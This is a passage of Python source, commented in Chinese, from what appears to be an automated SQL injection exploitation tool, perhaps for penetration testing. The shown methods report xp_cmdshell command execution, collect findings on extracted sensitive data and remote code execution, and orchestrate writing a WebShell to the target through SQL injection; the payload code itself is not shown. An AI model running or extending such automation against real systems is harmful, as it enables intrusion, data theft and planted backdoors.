                    results["output"] = "MSSQL xp_cmdshell access obtained"
                    logger.info(f"[真实检测]  MSSQL xp_cmdshell执行成功!")
                else:
                    logger.info(f"[真实检测] MSSQL xp_cmdshell执行失败")

        except Exception as e:
            logger.error(f"[真实检测] 命令执行尝试失败: {str(e)}")
            results["error"] = str(e)

        return results

    def _generate_findings(self, results: Dict) -> List[Dict[str, Any]]:
        """
        生成发现列表

        Args:
            results: 挖掘结果

        Returns:
            发现列表
        """
        findings = []

        # 注入点发现
        if results.get("phases", {}).get("injection_enumeration", {}).get("found"):
            findings.append({
                "type": "SQL Injection",
                "severity": "Critical",
                "description": "发现SQL注入漏洞",
                "locations": results["phases"]["injection_enumeration"]
            })

        # 数据提取发现
        if results.get("extracted_data"):
            findings.append({
                "type": "Data Extraction",
                "severity": "High",
                "description": "成功提取敏感数据",
                "data": results["extracted_data"]
            })

        # 文件操作发现
        if results.get("file_access", {}).get("write_shell"):
            findings.append({
                "type": "File Write",
                "severity": "Critical",
                "description": "成功写入WebShell",
                "path": results["file_access"]["shell_path"]
            })

        # 命令执行发现
        if results.get("command_execution", {}).get("rce"):
            findings.append({
                "type": "RCE",
                "severity": "Critical",
                "description": "通过SQL注入实现命令执行",
                "method": results["command_execution"]["method"]
            })

        return findings

    def _write_webshell_via_sql(self, target: str, injection_points: Dict, db_info: Dict) -> Dict[str, Any]:
        """
        通过SQL注入写入WebShell - 链式推理自动执行

        这是一个包装方法，调用已有的文件操作功能

        Args:
            target: 目标URL
            injection_points: 注入点
            db_info: 数据库信息

        Returns:
            写入结果
        """
        logger.info("[链式推理] 执行: 通过SQL注入写入WebShell")

        # 调用已有的文件操作方法
        file_ops_result = self._attempt_file_operations(target, injection_points, db_info)

        # 如果文件操作成功写入WebShell，返回成功
        if file_ops_result.get("write_shell"):
            return {
                "success": True,
                "shell_path": file_ops_result.get("shell_path"),
                "method": "sql_injection_write",
                "message": f"成功通过SQL注入写入WebShell: {file_ops_result.get('shell_path')}"
            }
        else:
            return {
                "success": False,
                "message": "无法通过SQL注入写入WebShell",
                "details": file_ops_result
            }

